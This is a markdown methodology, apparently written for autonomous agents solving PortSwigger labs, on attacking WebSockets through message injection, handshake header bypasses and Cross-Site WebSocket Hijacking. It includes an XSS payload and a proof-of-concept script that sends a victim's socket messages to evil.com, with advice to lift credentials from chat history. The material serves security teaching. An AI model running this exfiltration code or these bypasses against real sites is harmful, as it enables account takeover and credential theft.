# WebSockets Security Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> WebSockets carry the same bug classes as HTTP (XSS, SQLi, auth) plus their
> own: Cross-Site WebSocket Hijacking (CSWSH) from missing origin checks.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Identify the Handshake
```
GET /chat HTTP/1.1
Host: target
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Origin: https://target
```
- Note whether the handshake authenticates via cookies only.
- Does the server validate the `Origin` header? (Key question for CSWSH.)

### 1.2 Observe Message Format
- JSON? Plaintext? Which fields are reflected to other users (chat) or hit a
  backend query (support bot)?

---

## Phase 2: Exploitation Techniques

### 2.1 Manipulating Messages (XSS / SQLi over WS)
- Edit intercepted frames in Burp. Inject into any field echoed to a victim:
```json
{"message":"<img src=x onerror=print()>"}
```
- Backend-reaching fields may be SQLi/command sinks — apply sqli.md payloads.

### 2.2 Cross-Site WebSocket Hijacking (CSWSH)
- If the handshake relies on cookies and the server does not check `Origin`,
  an attacker page can open an authenticated socket and exfiltrate messages:
```html
<script>
var ws = new WebSocket('wss://target/chat');
ws.onopen = () => ws.send('READY');
ws.onmessage = e => fetch('https://evil.com/?d='+encodeURIComponent(e.data));
</script>
```
- Read back the victim's chat history (often contains credentials).

### 2.3 Bypassing Handshake/Input Filters
- Manipulate the `X-Forwarded-For` in the handshake to bypass IP controls.
- Obfuscate XSS payloads that the server sanitizes on the way in but not out.

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Manipulating WebSocket messages to exploit vulnerabilities**: inject XSS
  into a chat `message` field.
- **Manipulating the WebSocket handshake**: add `X-Forwarded-For` to defeat a
  filter that blocked your IP after an XSS attempt.
- **Cross-site WebSocket hijacking**: exploit-server page opens `wss://target`
  and exfils the chat log containing the victim's credentials, then log in.

---

## Phase 4: Tools & Automation
- Burp Proxy → **WebSockets history**; edit + resend frames in Repeater.
- Host the CSWSH PoC on the exploit server; deliver to victim; read the log.

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| Payload sanitized inbound | Try alternate encodings / handshake header tricks |
| CSWSH connection refused | Confirm no Origin check; use `wss://` for TLS pages |
| No creds in history | Trigger a flow that makes the victim send secrets |

## Success Criteria
- [ ] Injected/exfiltrated data over the socket
- [ ] Obtained victim data or executed script in their context
- [ ] Lab shows "solved"
